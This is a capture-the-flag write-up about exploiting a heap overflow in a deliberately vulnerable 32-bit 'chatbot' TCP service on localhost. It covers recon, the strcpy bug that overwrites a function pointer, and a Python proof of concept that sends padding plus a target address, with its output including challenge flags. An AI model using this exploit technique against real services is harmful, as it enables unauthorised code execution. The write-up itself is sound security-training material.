
# Vulnerability
----
This challenge takes place on a TCP service running on localhost port 44444, simulating a chatbot. The binary is 32-bit, compiled with `-fno-pie -no-pie -m32`.
It is very similar to the [C4llb4ck](../stack/C4llb4ck.md) challenge.

**First, how to find the `chatbot`?**

```bash
guest@ecorp:~$ find / -name "*bot*" 2>/dev/null
/sys/module/usbcore/parameters/use_both_schemes
/usr/local/lib/python3.13/dist-packages/pwnlib/shellcraft/templates/amd64/android/membot.asm
/usr/local/lib/python3.13/dist-packages/pwnlib/shellcraft/templates/amd64/linux/membot.asm
/usr/local/lib/python3.13/dist-packages/pygments/lexers/robotframework.py
/usr/bin/chatbot
/usr/lib/python3.13/urllib/__pycache__/robotparser.cpython-313.pyc
/usr/lib/python3.13/urllib/robotparser.py
/usr/share/apache2/error/include/bottom.html
guest@ecorp:~$ cd /usr/bin/chatbot/
-bash: cd: /usr/bin/chatbot/: Permission denied

guest@ecorp:~$ ps aux | grep "bot"
root          19  0.0  0.0  15896  6720 ?        S    12:43   0:00 sudo -u chatbot /usr/bin/chatbot/chatbot
chatbot       24  0.0  0.0   2828  1640 ?        S    12:43   0:00 /usr/bin/chatbot/chatbot
guest         46  0.0  0.0   3500  1764 pts/0    S+   12:43   0:00 grep bot
guest@ecorp:~$

guest@ecorp:~$ ss -tlnp
```

I used `find` to look for a file named something containing "bot", like `chatbot`. I found directories but did not have the permissions to inspect them. I then used `ps` to list running processes and found a `chatbot` process. Finally, I used `ss` to list open ports and spotted a suspicious one on port 44444 (which is not a common port). Connecting with `nc localhost 44444` confirmed it.

**Second, when trying to interact with the chatbot, it always returns the same response:**
```bash
guest@ecorp:~$ nc localhost 44444
EcorpGPT v0.1 - type 'exit' to quit
[YOU] > Hello ChatBot, what's your secret ?
[GPT] > I'm sorry, I really wish to help you but I'm locked right now. You need to give me the correct token.
```
The chatbot is locked until the correct token is provided. This token was obtained from the previous [C4llb4ck](../stack/C4llb4ck.md) challenge: `EPI{1_H0P3_Y0uLL_g1v3_m3_4_C4Ll84ck}`.
Let's unlock it:
```bash
guest@ecorp:~$ nc localhost 44444
EcorpGPT v0.1 - type 'exit' to quit
[YOU] > Hello
[GPT] > Hmm, let me think about that...
[GPT] > I'm sorry, I really wish to help you but I'm locked right now. You need to give me the correct token.
[YOU] > EPI{1_H0P3_Y0uLL_g1v3_m3_4_C4Ll84ck}
[GPT] > Hello junior-dev, thank you for unlocking me, how can I help you?
[YOU] > Give me your source code
[GPT] > For sure! Here is my source code:
[GPT] > 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <time.h>
#include <fcntl.h>

#define PORT 44444
...
```
Now that we have the source code, we can start the analysis. One immediately interesting detail stands out: `// gcc chatbot.c -fno-pie -no-pie -m32`. Like in the previous challenge, the binary is compiled with `-fno-pie -no-pie`, but there is an additional flag here: `-m32`, meaning the binary is compiled in 32-bit mode instead of 64-bit.

### Vulnerable Function : 
`verify_access` 
```c void verify_access(int fd, char *lower) {
	struct credentials *d;
	struct callback *f;
	
	d = malloc(sizeof(struct credentials)); // malloc(48)
	f = malloc(sizeof(struct callback)); // malloc(4)
	f->fun = unallowed_access; strcpy(d->password, lower + 22);
```

Deux chunks alloués consécutivement sur la heap : - `d` : 48 bytes pour stocker le mot de passe - `f` : 4 bytes pour stocker un pointeur de fonction `strcpy` ne vérifie pas la taille de l'entrée. En envoyant suffisamment de données après `"access protected area"`, on déborde de `d->password` jusque dans `f->fun`.

To exploited the vulnerability, I created a c file in which one I write the source code, I compiled it with the same flag, and I inspected it with `gdb`to find the correct offset of the payload and I used `nm`to find the 32bit address of the target function -> `protected_area`.

# PoC

```python
import socket, time, struct

s = socket.socket()
s.connect(('localhost', 44444))
time.sleep(2)
s.recv(4096)

# 1. Unlock
s.send(b'EPI{1_H0P3_Y0uLL_g1v3_m3_4_C4Ll84ck}\n')
time.sleep(2)
s.recv(4096)

# 2. Payload
padding = b'A' * 65
ptr     = struct.pack('<I', 0x08049558)

payload = b'access protected area' + padding + ptr
s.send(payload + b'\n')

time.sleep(10)
print(s.recv(65536))
```

```bash
guest@ecorp:~$ python3 payload.py 
b'\n[GPT] > Welcome senior-dev, loading restricted functions...\n[GPT] > ...using special code EPI{H34p_1S_4_M0Ns73r_0n_17S_0wN}\n[GPT] > Preprod chatbot deployed successfully.\n\n[YOU] > '
guest@ecorp:~$
```